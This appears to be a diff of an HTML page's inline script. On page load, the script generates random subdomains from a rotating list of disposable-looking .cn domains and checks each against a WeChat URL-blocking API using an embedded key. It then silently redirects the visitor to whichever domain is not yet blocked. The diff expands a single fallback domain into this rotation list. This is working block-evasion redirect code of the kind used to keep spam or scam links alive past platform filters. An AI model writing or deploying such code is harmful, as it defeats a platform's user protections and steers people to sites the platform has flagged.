@@ -87,47 +87,67 @@
 </div>
 
 
-  <script>
-    // 生成两位随机字符的函数
-    function getRandomTwoChars() {
-      var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-      var result = '';
-      for (var i = 0; i < 2; i++) {
-        var randomIndex = Math.floor(Math.random() * chars.length);
-        result += chars[randomIndex];
-      }
-      return result;
+<script>
+  // 生成两位随机字符的函数
+  function getRandomTwoChars() {
+    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+    var result = '';
+    for (var i = 0; i < 2; i++) {
+      var randomIndex = Math.floor(Math.random() * chars.length);
+      result += chars[randomIndex];
     }
+    return result;
+  }
 
-    // 检测域名是否有效的函数
-    function checkDomain(url) {
-      fetch(url)
-        .then(response => response.json())
-        .then(data => {
-          if (data.Code === "102") {
-            // 如果返回的信息是102，则跳转到该域名
-            window.location.href = decodeURIComponent(data.Data);
-          } else if (data.Code === "002") {
-            // 如果返回的是002，则等待20秒再检测
-            setTimeout(() => {
-              var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
-              checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
-            }, 20000); // 20000毫秒 = 20秒
-          } else {
-            // 处理其他返回情况
-            var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
+  // 域名列表
+  const domains = [
+    '*.kkgneiyyys.cn',
+    '*.heiuuafeiyyye.cn',
+    '*.oognriyyys.cn',
+    '*.bgrhuyyys.cn',
+    '*.gngrieyyys.cn',
+    '*.heiylcna.cn',
+    '*.ksxd.cn'
+  ];
+
+  // 从域名列表中随机选择一个域名，并返回完整的 URL
+  function getRandomDomain() {
+    // 随机选择一个域名模板
+    const domainTemplate = domains[Math.floor(Math.random() * domains.length)];
+    // 替换 "*" 为随机生成的字符
+    return 'http://' + domainTemplate.replace('*', getRandomTwoChars());
+  }
+
+  // 检测域名是否有效的函数
+  function checkDomain(url) {
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        if (data.Code === "102") {
+          // 如果返回的信息是102，则跳转到该域名
+          window.location.href = decodeURIComponent(data.Data);
+        } else if (data.Code === "002") {
+          // 如果返回的是002，则等待20秒再检测
+          setTimeout(() => {
+            var targetUrl = getRandomDomain(); // 获取一个新的随机域名
             checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
-          }
-        })
-        .catch(error => {
-          console.error('检测域名时发生错误:', error);
-        });
-    }
+          }, 20000); // 20000毫秒 = 20秒
+        } else {
+          // 处理其他返回情况
+          var targetUrl = getRandomDomain(); // 获取一个新的随机域名
+          checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
+        }
+      })
+      .catch(error => {
+        console.error('检测域名时发生错误:', error);
+      });
+  }
 
-    // 开始检测域名并显示加载指示器
-    var targetUrl = 'http://' + getRandomTwoChars() + '.kipiit.cn';
-    checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
-  </script>
+  // 开始检测域名并显示加载指示器
+  var targetUrl = getRandomDomain(); // 获取一个随机域名
+  checkDomain('https://wx.rrbay.com/pro/wxUrlCheck2.ashx?key=ee8dd85eeacb68ec6f8f719386bf7544&url=' + encodeURIComponent(targetUrl));
+</script>
+
 </body>
 
 </html>
